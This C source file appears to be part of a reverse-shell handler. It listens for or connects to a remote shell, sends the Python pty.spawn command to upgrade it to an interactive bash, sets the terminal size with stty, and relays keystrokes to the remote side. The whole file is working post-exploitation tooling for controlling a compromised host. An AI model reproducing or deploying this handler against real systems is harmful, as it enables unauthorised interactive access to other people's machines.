#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sys/socket.h>
#include <arpa/inet.h>

#include <pthread.h>
#include <unistd.h>

#include "connection.h"
#include "terminal.h"
#include "utils.h"
#include "arguments.h"

void *connectionHandlerReadingThreadHandler(void *arg){
    Connection *c = (Connection*)arg;

    int read_size;
    char message[1024];
    while( (read_size = recv(c->socket, message, 1024, 0)) > 0 ){
        for(int i=0;i<read_size;i++){
            putchar(message[i]);
            fflush(stdout);
        }
    }

    if(read_size == 0){
        error("Disconnected.");
        fflush(stdout);
    }
    else if(read_size == -1){
        error("recv() failed.");
    }

    close(c->socket);
    free(arg);

    exit_(1);
    return NULL;
}

void sendTerminalSize(Connection *c, struct winsize w){
    char str[255];
    sprintf(str, "stty rows %d cols %d\n", w.ws_row, w.ws_col);
    send(c->socket, str, strlen(str), 0);
}

int connectionHandler(Connection *c){
    TerminalStart();
    send(c->socket, "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n", 48, 0);
    sendTerminalSize(c, TerminalGetSize());

    pthread_t connectionHandlerReadingThread;
    if(pthread_create(&connectionHandlerReadingThread, NULL, connectionHandlerReadingThreadHandler, (void*)c) < 0){
        error("Could not create reading thread in connection handler.");
        return 0;
    }

    char chr;
    while(1){
        chr = getchar();
        send(c->socket, &chr, 1, 0);
    }

    TerminalStop();
}

int client(Connection *c, Arguments *args){
    c->socket = socket(AF_INET, SOCK_STREAM, 0);
    if(c->socket == -1){
        error("Cannot create socket.");
        exit_(1);
    }

    if(Connection_setIpPortAddress(c, args->clientIp, args->clientPort) == -1){
        error("Invalid remote server %s:%d", args->clientIp, args->clientPort);
        exit_(1);
    }

    if(!Connection_Connect(c)){
        if(c->type == IPV4){
            error("Cannot connect to remote server (%s:%d).", args->clientIp, args->clientPort);
        }
        else if(c->type == IPV6){
            error("Cannot connect to remote server ([%s]:%d).", args->clientIp, args->clientPort);
        }
        exit_(1);
    }

    connectionHandler(c);

    return 0;
}

int server(Connection *c, Arguments *args){
    c->socket = socket(AF_INET, SOCK_STREAM, 0);
    if(c->socket == -1){
        error("Cannot create socket.");
        exit_(1);
    }

    c->addr.sin_family = AF_INET;
    c->addr.sin_addr.s_addr = INADDR_ANY;
    c->addr.sin_port = htons(args->serverPort);

    c->type = IPV4;

    if(bind(c->socket, (struct sockaddr*)&(c->addr), sizeof(c->addr)) < 0){
        error("Bind failed on %d.", args->serverPort);
        exit_(1);
    }

    listen(c->socket, 3);

    int socketServerNewClient;
    struct sockaddr_in socketServerNewAddr;

    int sockaddr_inLen = sizeof(struct sockaddr_in);
    while((socketServerNewClient = accept(c->socket, (struct sockaddr*)&(socketServerNewAddr), (socklen_t*)&sockaddr_inLen))){
        Connection *serverNewClientConnection;
        Connection_Init(&serverNewClientConnection);

        serverNewClientConnection->socket = socketServerNewClient;
        serverNewClientConnection->addr = socketServerNewAddr;

        printf("New connection from %s:%d\n", inet_ntoa(serverNewClientConnection->addr.sin_addr), htons(serverNewClientConnection->addr.sin_port));

        connectionHandler(serverNewClientConnection);
    }

    if(socketServerNewClient < 0){
        error("Accept failed.");
        exit_(1);
    }

    return 0;
}
